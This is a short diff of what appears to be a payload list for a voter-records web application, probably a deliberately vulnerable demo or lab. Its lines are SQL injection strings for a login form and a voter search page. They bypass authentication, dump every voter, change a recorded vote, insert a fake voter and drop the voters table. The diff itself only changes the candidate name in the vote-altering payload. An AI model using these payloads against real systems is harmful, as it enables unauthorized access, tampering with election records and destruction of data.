@@ -6,7 +6,7 @@ password: ' OR '1'='1
 # Search voters page
 Normal: V105
 Retrieve all voters: ' OR '1'='1
-Update a voter's vote: V105'; UPDATE voters SET vote_casted='Charlie' WHERE voter_id='V105'; --
+Update a voter's vote: V105'; UPDATE voters SET vote_casted='Candidate X' WHERE voter_id='V105'; --
 Add a fake voter: V105'; INSERT INTO voters (name, voter_id, vote_casted) VALUES ('Hacker', 'V999', 'Candidate X'); --
 Drop the voters table: V105'; DROP TABLE voters; --
 
